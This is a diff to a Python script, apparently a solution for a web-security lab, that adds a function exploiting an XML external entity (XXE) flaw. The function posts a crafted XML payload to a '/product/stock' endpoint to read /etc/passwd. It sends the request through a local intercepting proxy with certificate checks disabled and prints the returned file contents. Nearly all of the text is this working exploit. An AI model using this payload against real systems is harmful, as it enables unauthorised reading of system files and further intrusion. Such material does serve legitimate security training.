@@ -5,6 +5,15 @@ urllib3.disable_warnings(urllib3.exceptions.SecurityWarning)
 
 proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
 
+def exploit_xxe(s,url):
+    print('[+] Exploiting XXE Vulnerability...')
+    stock_path = url + '/product/stock'
+    exploit = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>'
+    r = requests.post(stock_path,data=exploit,verify=False,proxies=proxies)
+    print('[+] The following is the content of the /etc/passwd file:')
+    print(r.text)
+    sys.exit(-1)
+
 def main():
     if len(sys.argv) != 2:
         print('[Oops]')
